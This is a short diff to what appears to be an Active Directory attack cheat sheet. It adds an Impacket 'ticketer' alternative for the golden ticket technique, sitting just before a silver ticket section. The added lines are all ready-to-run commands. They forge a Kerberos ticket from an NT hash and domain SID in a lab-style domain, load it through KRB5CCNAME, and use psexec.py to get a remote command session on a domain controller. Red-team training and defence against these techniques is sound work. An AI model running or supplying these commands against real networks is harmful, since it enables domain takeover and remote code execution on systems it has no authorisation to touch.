@@ -46,6 +46,14 @@
 
 #### 8) ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100
 
+## Alternate Method: Impacket Ticketer
+
+#### 1) python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
+
+#### 2) export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
+
+#### 3) python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
+
 # SILVER TICKET
 
 ### Forging a Service Ticket (ST) require machine account password (key) or NT hash of the service account.
